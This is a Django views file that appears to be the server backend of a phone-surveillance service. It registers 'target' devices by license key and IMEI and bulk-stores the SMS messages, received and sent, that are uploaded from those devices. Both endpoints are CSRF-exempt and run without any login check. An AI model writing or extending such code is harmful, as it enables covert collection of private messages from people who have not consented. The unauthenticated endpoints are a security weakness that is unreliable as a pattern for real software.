from authentication.tasks import fetch_sms
from .models import SMSMessages, Target
from .forms import ConnectTargetForm
import datetime
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.utils.decorators import method_decorator
from django.views import View
from django.contrib.auth.mixins import LoginRequiredMixin
import json

@method_decorator(csrf_exempt, name='dispatch')
class ConnectTargetView(View):
    csrf_exempt = True

    def post(self, request, *args, **kwargs):
        forms = ConnectTargetForm(json.loads(request.body))

        if forms.is_valid() is False:
            return JsonResponse({"error": "Invalid form data"})

        try:
            license_key = kwargs["license_key"]
            target = Target.objects.get(license_key=license_key)
        except Target.DoesNotExist:
            return JsonResponse({"error": "Target not found"})

        last_sync = datetime.datetime.now()

        Target.objects.filter(license_key=license_key).update(
            last_sync=last_sync, status="active", **forms.cleaned_data)

        target = Target.objects.filter(
            license_key=license_key).values().first()

        return JsonResponse({"target": target})
    

@method_decorator(csrf_exempt, name='dispatch')
class SyncCallbackView(View):
    def post(self, request, *args, **kwargs):
        target_id = kwargs["target_id"]
        imei = kwargs["device_imei"]
        license_key = kwargs["license_key"]
        sync_type = kwargs["sync_type"]

        body = json.loads(request.body)

        target = Target.objects.filter(
            id=target_id, device_imei=imei, license_key=license_key).first()
        
        if target is None:
            return JsonResponse({"status": "error", "message": "Target not found"})

        if sync_type == "sms":
            messages = body["data"]

            # Get all message_ids already saved for the target
            existing_ids = set(
                SMSMessages.objects.filter(
                    target=target,
                    message_id__in=[msg["id"] for msg in messages]
                ).values_list("message_id", flat=True)
            )

            # Filter out messages that are already saved
            new_messages = [
                SMSMessages(
                    target=target,
                    message_id=msg["id"],
                    address=msg["address"],
                    message=msg["body"],
                    date=datetime.datetime.fromtimestamp(msg["date"] / 1000),
                    message_type="INBOX" if msg["type"] == "SmsType.MESSAGE_TYPE_INBOX" else "SENT",
                )
                for msg in messages if msg["id"] not in existing_ids
            ]

            # Bulk insert only new messages
            if new_messages:
                SMSMessages.objects.bulk_create(new_messages, ignore_conflicts=True)

        return JsonResponse({"status": "success"})